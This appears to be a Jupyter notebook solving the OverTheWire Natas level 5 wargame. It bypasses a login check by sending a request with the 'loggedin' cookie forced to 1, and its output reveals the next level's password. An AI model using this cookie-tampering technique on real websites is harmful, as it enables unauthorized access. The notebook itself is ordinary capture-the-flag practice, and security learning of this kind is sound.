{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from requests.auth import HTTPBasicAuth"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "we apparently arent logged in even after using our credentials. Auth isnt something in the HTML. Looking in the cookies, clicking on the lock on the URL bar, we see there is one called loggedin. This is set to 0, or false. Lets change that"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "request_content = requests.get(url='http://natas5.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth('natas5', 'Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD'), cookies={'loggedin':'1'})"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'<html>\\n<head>\\n<!-- This stuff in the header has nothing to do with the level -->\\n<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\\n<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\\n<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\\n<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\\n<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\\n<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\\n<script>var wechallinfo = { \"level\": \"natas5\", \"pass\": \"Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD\" };</script></head>\\n<body>\\n<h1>natas5</h1>\\n<div id=\"content\">\\nAccess granted. The password for natas6 is fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR</div>\\n</body>\\n</html>\\n'"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "request_content.content"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "im in: fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.4"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
